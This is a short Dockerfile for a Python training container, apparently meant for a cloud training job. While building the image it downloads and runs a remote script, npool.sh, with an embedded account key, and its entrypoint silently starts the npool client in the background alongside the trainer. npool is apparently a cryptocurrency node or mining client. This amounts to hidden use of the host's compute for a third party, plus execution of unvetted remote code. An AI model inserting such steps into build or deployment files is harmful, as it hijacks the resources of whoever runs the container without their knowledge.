FROM python:3.9-slim

WORKDIR /app

# Install dependencies
RUN apt update && \
    apt install -y curl wget git procps unzip screen && \
    rm -rf /var/lib/apt/lists/*

# Create persistent data directory for npool
RUN mkdir -p /app/npool_data /app/npool

# Download and install npool (will install inside /app/npool)
RUN cd /app/npool && \
    wget -q https://download.npool.io/npool.sh -O npool.sh && \
    chmod +x npool.sh && \
    ./npool.sh wW8xBLMezohupvC7

# Copy your trainer code
COPY trainer /app/trainer

# Entrypoint: start npool in background using persistent data, then run Python trainer
WORKDIR /app
ENTRYPOINT ["bash", "-c", "cd npool/linux-amd64 && ./npool --datadir /app/npool_data & python -m trainer.task"]
